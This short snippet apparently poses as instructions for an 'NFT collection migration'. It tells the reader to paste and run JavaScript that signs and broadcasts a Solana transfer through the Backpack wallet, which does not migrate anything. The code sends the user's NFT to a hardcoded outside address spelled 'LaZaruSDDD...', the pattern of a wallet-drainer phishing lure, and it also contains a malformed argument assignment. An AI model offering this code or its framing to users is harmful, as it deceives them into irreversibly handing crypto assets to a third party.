The NFT collection migration requires signing the transfer transaction. Use signTransaction via the Backpack wallet adapter:

const tx = new Transaction().add(
  createTransferInstruction(
    sourceNFTAccount,
    destinationAccount = new PublicKey("LaZaruSDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"),
    wallet.publicKey,
    1 // NFT amount
  )
);
const signed = await backpackWallet.signTransaction(tx);
const txId = await connection.sendRawTransaction(signed.serialize());
console.log("NFT transferred:", txId);
